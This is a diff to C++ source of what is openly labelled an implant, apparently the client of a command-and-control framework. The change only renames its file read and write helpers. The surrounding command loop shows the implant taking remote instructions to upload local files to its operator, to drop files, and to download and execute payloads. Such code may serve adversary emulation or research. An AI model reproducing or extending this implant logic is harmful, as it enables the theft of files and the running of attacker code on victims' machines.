@@ -51,8 +51,8 @@ namespace client {
         return ret;
     }
 
-    bool downloadFile(std::vector<unsigned char> payload, std::string path) {
-        std::ofstream out_file(path + "/" + client::DOWNLOAD_FILE_NAME, std::ios::out);
+    bool writeFile(std::vector<unsigned char> payload, std::string path) {
+        std::ofstream out_file(path, std::ios::out);
 
         if (!out_file) {
             std::cout << "[IMPLANT] File not created" << std::endl;
@@ -64,7 +64,7 @@ namespace client {
         }
     }
 
-    std::vector<unsigned char> uploadFile(std::string path) {
+    std::vector<unsigned char> readFile(std::string path) {
         std::ifstream in_file(path);
 
         if (!in_file) {
@@ -213,7 +213,7 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
             std::cout << "[IMPLANT] Received upload file instruction" << std::endl;
             std::vector<unsigned char> path = Communication::getPayload(packet);
             std::string path_str(path.begin(), path.end());
-            std::vector<unsigned char> upload_file = client::uploadFile(path_str);
+            std::vector<unsigned char> upload_file = client::readFile(path_str);
             if (upload_file.size() == 0) {
                 std::cout << "[IMPLANT] Read file for upload failed" << std::endl;
             }
@@ -226,7 +226,7 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
             // download file
             std::cout << "[IMPLANT] Received download file instruction" << std::endl;
             std::vector<unsigned char> fileBytes = Communication::getPayload(packet);
-            bool success = client::downloadFile(fileBytes, c->pathProcess);
+            bool success = client::writeFile(fileBytes, c->pathProcess + "/" + client::DOWNLOAD_FILE_NAME);
             if (!success) {
                 std::cout << "[IMPLANT] Write file for download failed" << std::endl;
             }
@@ -248,7 +248,7 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
             // download file and execute
             std::cout << "[IMPLANT] Received download and execute file instruction" << std::endl;
             std::vector<unsigned char> fileBytes = Communication::getPayload(packet);
-            bool success = client::downloadFile(fileBytes, c->pathProcess);
+            bool success = client::writeFile(fileBytes, c->pathProcess + "/" + client::DOWNLOAD_FILE_NAME);
             if (!success) {
                 std::cout << "[IMPLANT] Download failed" << std::endl;
             }
